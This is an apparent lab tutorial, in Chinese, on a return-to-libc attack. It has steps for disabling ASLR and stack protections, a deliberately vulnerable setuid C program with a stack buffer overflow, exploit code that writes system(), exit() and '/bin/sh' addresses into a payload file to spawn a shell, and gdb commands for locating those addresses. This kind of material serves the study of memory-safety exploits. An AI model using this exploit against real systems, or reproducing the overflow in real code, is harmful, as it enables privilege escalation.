# Return to libc攻击

成功的前提是要关闭一些保护机制

* 地址随机化 `sudo sysctl -w kernel.randomize_va_space = 0`
* 栈保护机制`gcc -fno-stack-protector ****.c`
* 栈不可执行`gcc -z execstack ****.c`



## 0x01 关闭系统的地址随机化

```shell
sudo sysctl -w kernel.randomize_va_space=0
```

![image-20210503122809632](C:\Users\anxin\AppData\Roaming\Typora\typora-user-images\image-20210503122809632.png)

## 0x02 准备好漏洞程序源码

1. `retlib.c`

2. `exploit.c`

   

漏洞程序源码`retlib.c`

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(FILE *badfile)
{
    char buffer[12];
    
    fread(buffer, sizeof(char), 40, badfile);
    
    return 1;
}

int main(int argc, char **argv)
{
    FILE *badfile;
    
    badfile = fopen("badfile", "r");
    bof(badfile);
    
    printf("Returned Properly\n");
    
    fclose(badfile);
    
    return 1;
}
```

在`root`环境下编译

```shell
sudo su
gcc -m32 -fno-stack-protector -z noexecstack -o retlib retlib.c
chmod 4755 retlib
exit
```

`exploit.c`利用脚本(三个地址需要重新计算，后面给出方法)

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
    char buf[40];
    FILE *badfile;
    int base = 24;
    badfile = fopen("./badfile", "w");
    
    /*
    caculate address
    */
    *(long *) &buf[base+8] = 0xb7f7ff18;	// "/bin/sh"
    *(long *) &buf[base] = 0xb7e5e430;		// system()
    *(long *) &buf[base+4] = 0xb7e51fb0;	// exit()
    
    fwrite(buf, sizeof(buf), 1, badfile);
    fclose(badfile);
}
```

编译运行`expliot`生成恶意`badfile`

```shell
gcc exploit.c -o exploit
./exploit
```

再次执行`retlib`

```shell
./retlib
```

成功结果如下

![image-20210503124833917](C:\Users\anxin\AppData\Roaming\Typora\typora-user-images\image-20210503124833917.png)



## 0x03三个地址的获取

#### 1. 获取`system`和`exit`函数的地址

> system， exit函数都在`libc`中，动态链接库在内存中

```shell
b main
r
p system
p exit
p __libc_start_main
```

![image-20210503124202705](C:\Users\anxin\AppData\Roaming\Typora\typora-user-images\image-20210503124202705.png)

#### 2. 获取内存中字符串`"/bin/sh"`的地址

可以使用`gdb`的`find` 命令

这里使用`peda` 插件的命令

```shell
searchmem "/bin/sh" libc
```

![image-20210503124532721](C:\Users\anxin\AppData\Roaming\Typora\typora-user-images\image-20210503124532721.png)





